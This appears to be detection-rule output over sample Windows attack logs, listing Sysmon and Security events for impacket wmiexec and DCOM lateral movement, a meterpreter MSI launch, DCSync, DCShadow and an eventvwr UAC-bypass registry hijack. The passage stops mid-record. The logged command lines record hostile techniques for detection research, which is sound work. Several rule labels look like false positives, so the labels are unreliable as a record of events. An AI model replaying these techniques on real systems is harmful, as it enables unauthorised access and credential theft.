2019-04-30T20:26:53.199839+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_sysmon_psexec_smb_meterpreter.evtx,1,Microsoft-Windows-Sysmon,13,9812,IEWIN7,"Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\services\hello\Start
RuleName: ''
EventType: SetValue
ProcessId: 460
ProcessGuid: 365ABB72-2586-5CC9-0000-0010DC530000
UtcTime: 2019-04-30 20:26:53.168
Details: DWORD (0x00000004)
"
2019-04-30T20:32:51.168589+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process;WmiPrvSE Spawned A Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmiexec_impacket_sysmon_whoami.evtx,1,Microsoft-Windows-Sysmon,1,9826,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 836
LogonGuid: 365ABB72-B0F2-5CC8-0000-00203D311D00
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-B0C0-5CC8-0000-001017C31C00
ProcessId: 3840
CurrentDirectory: C:\
ProcessGuid: 365ABB72-B0F3-5CC8-0000-00105F321D00
CommandLine: cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1556656369.7 2>&1
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x1d313d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
UtcTime: 2019-04-30 20:32:51.168
"
2019-04-30T20:32:51.246714+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process;WmiPrvSE Spawned A Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmiexec_impacket_sysmon_whoami.evtx,1,Microsoft-Windows-Sysmon,1,9827,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 836
LogonGuid: 365ABB72-B0F2-5CC8-0000-00203D311D00
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-B0C0-5CC8-0000-001017C31C00
ProcessId: 2504
CurrentDirectory: C:\
ProcessGuid: 365ABB72-B0F3-5CC8-0000-0010B1361D00
CommandLine: cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1556656369.7 2>&1
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x1d313d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
UtcTime: 2019-04-30 20:32:51.246
"
2019-04-30T20:32:51.324839+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process;WmiPrvSE Spawned A Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmiexec_impacket_sysmon_whoami.evtx,1,Microsoft-Windows-Sysmon,1,9828,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 836
LogonGuid: 365ABB72-B0F2-5CC8-0000-00203D311D00
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-B0C0-5CC8-0000-001017C31C00
ProcessId: 2828
CurrentDirectory: C:\
ProcessGuid: 365ABB72-B0F3-5CC8-0000-0010C43A1D00
CommandLine: cmd.exe /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__1556656369.7 2>&1
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x1d313d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
UtcTime: 2019-04-30 20:32:51.324
"
2019-04-30T20:32:51.371714+00:00,Hacktool - EDR-Freeze Execution;Local Accounts Discovery;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmiexec_impacket_sysmon_whoami.evtx,1,Microsoft-Windows-Sysmon,1,9829,IEWIN7,"Image: C:\Windows\System32\whoami.exe
RuleName: ''
Description: whoami - displays logged on user information
TerminalSessionId: 0
ParentCommandLine: cmd.exe /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__1556656369.7 2>&1
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2828
LogonGuid: 365ABB72-B0F2-5CC8-0000-00203D311D00
Hashes: SHA1=DC058F52AD8ACBD316827B6DCAC2434AB3CC515C,MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3,IMPHASH=C5352B949915AB8CD5E1844790D19274
ParentProcessGuid: 365ABB72-B0F3-5CC8-0000-0010C43A1D00
ProcessId: 3328
CurrentDirectory: C:\
ProcessGuid: 365ABB72-B0F3-5CC8-0000-0010373E1D00
CommandLine: 'whoami  /all '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x1d313d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-04-30 20:32:51.356
"
2019-04-30T20:35:11.856089+00:00,Hacktool - EDR-Freeze Execution;MMC20 Lateral Movement;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_impacket_docmexec_mmc_sysmon_01.evtx,1,Microsoft-Windows-Sysmon,1,9832,IEWIN7,"Image: C:\Windows\System32\mmc.exe
RuleName: ''
Description: Microsoft Management Console
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 612
LogonGuid: 365ABB72-B17F-5CC8-0000-0020C6A31E00
Hashes: SHA1=98D8C5E38510C6220F42747D15F6FFF75DD59845,MD5=A2A5D487D0C3D55739A0491B6872480D,SHA256=40E2B83F07771D54CE4E45B76A14883D042766FF4E1E7872E482EC91E81E9484,IMPHASH=6D2ED4ADDAC7EBAE62381320D82AC4C1
ParentProcessGuid: 365ABB72-2586-5CC9-0000-001087700000
ProcessId: 3572
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-B17F-5CC8-0000-001082A51E00
CommandLine: C:\Windows\system32\mmc.exe -Embedding
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x1ea3c6'
IntegrityLevel: High
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-04-30 20:35:11.856
"
2019-04-30T20:35:12.449839+00:00,Hacktool - EDR-Freeze Execution;MMC Spawning Windows Shell;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_impacket_docmexec_mmc_sysmon_01.evtx,1,Microsoft-Windows-Sysmon,1,9833,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\mmc.exe -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3572
LogonGuid: 365ABB72-B17F-5CC8-0000-0020C6A31E00
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-B17F-5CC8-0000-001082A51E00
ProcessId: 1504
CurrentDirectory: C:\windows\system32\
ProcessGuid: 365ABB72-B180-5CC8-0000-00102BB71E00
CommandLine: '""C:\Windows\System32\cmd.exe"" /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1556656511.61 2>&1'
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x1ea3c6'
IntegrityLevel: High
ParentImage: C:\Windows\System32\mmc.exe
UtcTime: 2019-04-30 20:35:12.340
"
2019-04-30T20:35:13.449839+00:00,Hacktool - EDR-Freeze Execution;MMC Spawning Windows Shell;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_impacket_docmexec_mmc_sysmon_01.evtx,1,Microsoft-Windows-Sysmon,1,9838,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\mmc.exe -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3572
LogonGuid: 365ABB72-B17F-5CC8-0000-0020C6A31E00
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-B17F-5CC8-0000-001082A51E00
ProcessId: 3372
CurrentDirectory: C:\
ProcessGuid: 365ABB72-B181-5CC8-0000-0010ADBF1E00
CommandLine: '""C:\Windows\System32\cmd.exe"" /Q /c cd  1> \\127.0.0.1\ADMIN$\__1556656511.61 2>&1'
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x1ea3c6'
IntegrityLevel: High
ParentImage: C:\Windows\System32\mmc.exe
UtcTime: 2019-04-30 20:35:13.434
"
2019-04-30T20:35:13.512339+00:00,Hacktool - EDR-Freeze Execution;MMC Spawning Windows Shell;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_impacket_docmexec_mmc_sysmon_01.evtx,1,Microsoft-Windows-Sysmon,1,9839,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\mmc.exe -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3572
LogonGuid: 365ABB72-B17F-5CC8-0000-0020C6A31E00
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-B17F-5CC8-0000-001082A51E00
ProcessId: 1256
CurrentDirectory: C:\
ProcessGuid: 365ABB72-B181-5CC8-0000-001023C41E00
CommandLine: '""C:\Windows\System32\cmd.exe"" /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__1556656511.61 2>&1'
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0x1ea3c6'
IntegrityLevel: High
ParentImage: C:\Windows\System32\mmc.exe
UtcTime: 2019-04-30 20:35:13.512
"
2019-04-30T20:35:13.543589+00:00,Hacktool - EDR-Freeze Execution;Local Accounts Discovery;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_impacket_docmexec_mmc_sysmon_01.evtx,1,Microsoft-Windows-Sysmon,1,9840,IEWIN7,"Image: C:\Windows\System32\whoami.exe
RuleName: ''
Description: whoami - displays logged on user information
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__1556656511.61 2>&1'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1256
LogonGuid: 365ABB72-B17F-5CC8-0000-0020C6A31E00
Hashes: SHA1=DC058F52AD8ACBD316827B6DCAC2434AB3CC515C,MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3,IMPHASH=C5352B949915AB8CD5E1844790D19274
ParentProcessGuid: 365ABB72-B181-5CC8-0000-001023C41E00
ProcessId: 692
CurrentDirectory: C:\
ProcessGuid: 365ABB72-B181-5CC8-0000-00108DC71E00
CommandLine: 'whoami  /all '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x1ea3c6'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-04-30 20:35:13.527
"
2019-04-30T22:48:59.260851+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,1,Microsoft-Windows-Sysmon,1,10148,IEWIN7,"Image: C:\Windows\System32\VSSVC.exe
RuleName: ''
Description: Microsoft® Volume Shadow Copy Service
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\services.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 464
LogonGuid: 365ABB72-4322-5CC9-0000-0020E7030000
Hashes: SHA1=99894AEF71D9D3527F392CD71F66571110593876,MD5=209A3B1901B83AEB8527ED211CCE9E4C,SHA256=1A431F6409F8E0531F600F8F988ECECECB902DA26BBAAF1DE74A5CAC29A7CB44,IMPHASH=212B2417B4778F3EE9DE3F60458E953F
ParentProcessGuid: 365ABB72-4321-5CC9-0000-001070530000
ProcessId: 1892
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-D0DB-5CC8-0000-0010488A3C00
CommandLine: C:\Windows\system32\vssvc.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\services.exe
UtcTime: 2019-04-30 22:48:59.151
"
2019-04-30T22:49:09.542101+00:00,Potential Persistence Using DebugPath,data/EVTX-ATTACK-SAMPLES/Execution/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,1,Microsoft-Windows-Sysmon,13,10150,IEWIN7,"Image: C:\Windows\system32\msiexec.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\InProgress\(Default)
RuleName: ''
EventType: SetValue
ProcessId: 2080
ProcessGuid: 365ABB72-D0DA-5CC8-0000-0010216F3C00
UtcTime: 2019-04-30 22:49:08.432
Details: C:\Windows\Installer\304d1d.ipi
"
2019-04-30T22:49:09.760851+00:00,UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,1,Microsoft-Windows-Sysmon,1,10151,IEWIN7,"Image: C:\Windows\Installer\MSI4FFD.tmp
RuleName: ''
Description: ApacheBench command line utility
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\msiexec.exe /V
Product: Apache HTTP Server
Company: Apache Software Foundation
ParentProcessId: 2080
LogonGuid: 365ABB72-C494-5CC8-0000-0020E4FF0000
Hashes: SHA1=06B1640F88EDC6A7CE3303CB14A505A86B061616,MD5=E40CF1CC132F25719F86F0FC5870910D,SHA256=A89385CCD4BE489CD069C65DA10A0B952CB3DE9090EF4C9F02E1368392CD66C5,IMPHASH=481F47BBB2C9C21E108D65F52B04C448
ParentProcessGuid: 365ABB72-D0DA-5CC8-0000-0010216F3C00
ProcessId: 3680
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-D0E4-5CC8-0000-00103CB73E00
CommandLine: '""C:\Windows\Installer\MSI4FFD.tmp""'
FileVersion: 2.2.14
User: IEWIN7\IEUser
LogonId: '0xffe4'
IntegrityLevel: High
ParentImage: C:\Windows\System32\msiexec.exe
UtcTime: 2019-04-30 22:49:08.604
"
2019-04-30T22:49:10.198351+00:00,Always Install Elevated MSI Spawned Cmd And Powershell;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,1,Microsoft-Windows-Sysmon,1,10153,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\Installer\MSI4FFD.tmp""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3680
LogonGuid: 365ABB72-C494-5CC8-0000-0020E4FF0000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-D0E4-5CC8-0000-00103CB73E00
ProcessId: 2892
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-D0E5-5CC8-0000-0010DADF3E00
CommandLine: cmd
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0xffe4'
IntegrityLevel: High
ParentImage: C:\Windows\Installer\MSI4FFD.tmp
UtcTime: 2019-04-30 22:49:09.276
"
2019-04-30T22:52:27.588976+00:00,Hacktool - EDR-Freeze Execution;Local Accounts Discovery;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,1,Microsoft-Windows-Sysmon,1,10154,IEWIN7,"Image: C:\Windows\System32\whoami.exe
RuleName: ''
Description: whoami - displays logged on user information
TerminalSessionId: 1
ParentCommandLine: cmd
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2892
LogonGuid: 365ABB72-C494-5CC8-0000-0020E4FF0000
Hashes: SHA1=DC058F52AD8ACBD316827B6DCAC2434AB3CC515C,MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3,IMPHASH=C5352B949915AB8CD5E1844790D19274
ParentProcessGuid: 365ABB72-D0E5-5CC8-0000-0010DADF3E00
ProcessId: 1372
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-D1AB-5CC8-0000-0010DB1E4400
CommandLine: whoami
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0xffe4'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-04-30 22:52:27.588
"
2019-05-08T02:10:43.487217+00:00,Active Directory Replication from Non Machine Account - DcSync Indicator,data/EVTX-ATTACK-SAMPLES/Credential Access/CA_DCSync_4662.evtx,1,Microsoft-Windows-Security-Auditing,4662,202791,DC1.insecurebank.local,"ObjectType: '%{19195a5b-6da0-11d0-afd3-00c04fd930c9}'
AdditionalInfo: '-'
ObjectName: '%{c6faf700-bfe4-452a-a766-424f84c29583}'
SubjectDomainName: insecurebank
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-500
OperationType: Object Access
HandleId: '0x0'
AccessMask: '0x100'
Properties: ""%%7688\r\n\t\t{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}\r\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\r\n""
SubjectLogonId: '0x40c6511'
SubjectUserName: Administrator
ObjectServer: DS
AdditionalInfo2: ''
AccessList: ""%%7688\r\n\t\t\t\t""
"
2019-05-08T02:10:43.487217+00:00,Active Directory Replication from Non Machine Account - DcSync Indicator,data/EVTX-ATTACK-SAMPLES/Credential Access/CA_DCSync_4662.evtx,1,Microsoft-Windows-Security-Auditing,4662,202793,DC1.insecurebank.local,"ObjectType: '%{19195a5b-6da0-11d0-afd3-00c04fd930c9}'
AdditionalInfo: '-'
ObjectName: '%{c6faf700-bfe4-452a-a766-424f84c29583}'
SubjectDomainName: insecurebank
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-500
OperationType: Object Access
HandleId: '0x0'
AccessMask: '0x100'
Properties: ""%%7688\r\n\t\t{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}\r\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\r\n""
SubjectLogonId: '0x40c6511'
SubjectUserName: Administrator
ObjectServer: DS
AdditionalInfo2: ''
AccessList: ""%%7688\r\n\t\t\t\t""
"
2019-05-08T02:10:43.487217+00:00,Active Directory Replication from Non Machine Account - DcSync Indicator,data/EVTX-ATTACK-SAMPLES/Credential Access/CA_DCSync_4662.evtx,1,Microsoft-Windows-Security-Auditing,4662,202792,DC1.insecurebank.local,"ObjectType: '%{19195a5b-6da0-11d0-afd3-00c04fd930c9}'
AdditionalInfo: '-'
ObjectName: '%{c6faf700-bfe4-452a-a766-424f84c29583}'
SubjectDomainName: insecurebank
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-500
OperationType: Object Access
HandleId: '0x0'
AccessMask: '0x100'
Properties: ""%%7688\r\n\t\t{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}\r\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\r\n""
SubjectLogonId: '0x40c6511'
SubjectUserName: Administrator
ObjectServer: DS
AdditionalInfo2: ''
AccessList: ""%%7688\r\n\t\t\t\t""
"
2019-05-08T03:00:37.572176+00:00,Possible DC Shadow Attack;Win Susp Computer Name Containing Samtheadmin,data/EVTX-ATTACK-SAMPLES/Persistence/persistence_security_dcshadow_4742.evtx,1,Microsoft-Windows-Security-Auditing,4742,203054,DC1.insecurebank.local,"PrivilegeList: '-'
NewUacValue: '-'
LogonHours: '-'
ScriptPath: '-'
DnsHostName: '-'
ProfilePath: '-'
AllowedToDelegateTo: '-'
HomePath: '-'
ComputerAccountChange: '-'
DisplayName: '-'
PrimaryGroupId: '-'
HomeDirectory: '-'
TargetUserName: ALICE$
TargetSid: S-1-5-21-738609754-2819869699-4189121830-1120
SidHistory: '-'
SubjectUserName: Administrator
UserPrincipalName: '-'
TargetDomainName: insecurebank
ServicePrincipalNames: ""\r\n\t\tHOST/alice.insecurebank.local\r\n\t\tRestrictedKrbHost/alice.insecurebank.local\r\n\t\tHOST/ALICE\r\n\t\tRestrictedKrbHost/ALICE\r\n\t\tTERMSRV/alice.insecurebank.local\r\n\t\tTERMSRV/ALICE\r\n\t\tWSMAN/alice.insecurebank.local\r\n\t\tWSMAN/alice\r\n\t\tGC/alice.insecurebank.local/insecurebank.local""
PasswordLastSet: '-'
UserParameters: '-'
SubjectLogonId: '0x418a6da'
SubjectDomainName: insecurebank
AccountExpires: '-'
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-500
OldUacValue: '-'
SamAccountName: '-'
UserAccountControl: '-'
UserWorkstations: '-'
"
2019-05-08T03:00:37.583261+00:00,Active Directory Replication from Non Machine Account - DcSync Indicator,data/EVTX-ATTACK-SAMPLES/Persistence/persistence_security_dcshadow_4742.evtx,1,Microsoft-Windows-Security-Auditing,4662,203056,DC1.insecurebank.local,"ObjectType: '%{19195a5b-6da0-11d0-afd3-00c04fd930c9}'
AdditionalInfo: '-'
ObjectName: '%{c6faf700-bfe4-452a-a766-424f84c29583}'
SubjectDomainName: insecurebank
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-500
OperationType: Object Access
HandleId: '0x0'
AccessMask: '0x100'
Properties: ""%%7688\r\n\t\t{9923a32a-3607-11d2-b9be-0000f87a36b2}\r\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\r\n""
SubjectLogonId: '0x418a6fb'
SubjectUserName: Administrator
ObjectServer: DS
AdditionalInfo2: ''
AccessList: ""%%7688\r\n\t\t\t\t""
"
2019-05-08T03:00:37.586173+00:00,Possible DC Shadow Attack;Win Susp Computer Name Containing Samtheadmin,data/EVTX-ATTACK-SAMPLES/Persistence/persistence_security_dcshadow_4742.evtx,1,Microsoft-Windows-Security-Auditing,4742,203057,DC1.insecurebank.local,"PrivilegeList: '-'
NewUacValue: '-'
LogonHours: '-'
ScriptPath: '-'
DnsHostName: '-'
ProfilePath: '-'
AllowedToDelegateTo: '-'
HomePath: '-'
ComputerAccountChange: '-'
DisplayName: '-'
PrimaryGroupId: '-'
HomeDirectory: '-'
TargetUserName: ALICE$
TargetSid: S-1-5-21-738609754-2819869699-4189121830-1120
SidHistory: '-'
SubjectUserName: Administrator
UserPrincipalName: '-'
TargetDomainName: insecurebank
ServicePrincipalNames: ""\r\n\t\tHOST/alice.insecurebank.local\r\n\t\tRestrictedKrbHost/alice.insecurebank.local\r\n\t\tHOST/ALICE\r\n\t\tRestrictedKrbHost/ALICE\r\n\t\tTERMSRV/alice.insecurebank.local\r\n\t\tTERMSRV/ALICE\r\n\t\tWSMAN/alice.insecurebank.local\r\n\t\tWSMAN/alice\r\n\t\tGC/alice.insecurebank.local/insecurebank.local\r\n\t\tE3514235-4B06-11D1-AB04-00C04FC2DCD2/ae9a3b29-01d1-4851-8ca8-e49cd3985e5b/insecurebank.local""
PasswordLastSet: '-'
UserParameters: '-'
SubjectLogonId: '0x418a6fb'
SubjectDomainName: insecurebank
AccountExpires: '-'
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-500
OldUacValue: '-'
SamAccountName: '-'
UserAccountControl: '-'
UserWorkstations: '-'
"
2019-05-08T03:00:37.624196+00:00,Win Susp Computer Name Containing Samtheadmin,data/EVTX-ATTACK-SAMPLES/Persistence/persistence_security_dcshadow_4742.evtx,1,Microsoft-Windows-Security-Auditing,4742,203062,DC1.insecurebank.local,"PrivilegeList: '-'
NewUacValue: '-'
LogonHours: '-'
ScriptPath: '-'
DnsHostName: '-'
ProfilePath: '-'
AllowedToDelegateTo: '-'
HomePath: '-'
ComputerAccountChange: '-'
DisplayName: '-'
PrimaryGroupId: '-'
HomeDirectory: '-'
TargetUserName: ALICE$
TargetSid: S-1-5-21-738609754-2819869699-4189121830-1120
SidHistory: '-'
SubjectUserName: Administrator
UserPrincipalName: '-'
TargetDomainName: insecurebank
ServicePrincipalNames: ""\r\n\t\tHOST/alice.insecurebank.local\r\n\t\tRestrictedKrbHost/alice.insecurebank.local\r\n\t\tHOST/ALICE\r\n\t\tRestrictedKrbHost/ALICE\r\n\t\tTERMSRV/alice.insecurebank.local\r\n\t\tTERMSRV/ALICE\r\n\t\tWSMAN/alice.insecurebank.local\r\n\t\tWSMAN/alice\r\n\t\tE3514235-4B06-11D1-AB04-00C04FC2DCD2/ae9a3b29-01d1-4851-8ca8-e49cd3985e5b/insecurebank.local""
PasswordLastSet: '-'
UserParameters: '-'
SubjectLogonId: '0x418a6da'
SubjectDomainName: insecurebank
AccountExpires: '-'
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-500
OldUacValue: '-'
SamAccountName: '-'
UserAccountControl: '-'
UserWorkstations: '-'
"
2019-05-09T01:59:28.669022+00:00,Bypass UAC Using Event Viewer;Potential Persistence Using DebugPath,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_13_1_UAC_Bypass_EventVwrBypass.evtx,1,Microsoft-Windows-Sysmon,13,11112,IEWIN7,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3583694148-1414552638-2922671848-1000_CLASSES\mscfile\shell\open\command\(Default)
RuleName: ''
EventType: SetValue
ProcessId: 2704
ProcessGuid: 365ABB72-88DC-5CD3-0000-00100DA51A00
UtcTime: 2019-05-09 01:59:28.669
Details: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
"
2019-05-09T01:59:28.684647+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_13_1_UAC_Bypass_EventVwrBypass.evtx,1,Microsoft-Windows-Sysmon,1,11113,IEWIN7,"Image: C:\Windows\System32\eventvwr.exe
RuleName: ''
Description: Event Viewer Snapin Launcher
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2704
LogonGuid: 365ABB72-863B-5CD3-0000-002082390100
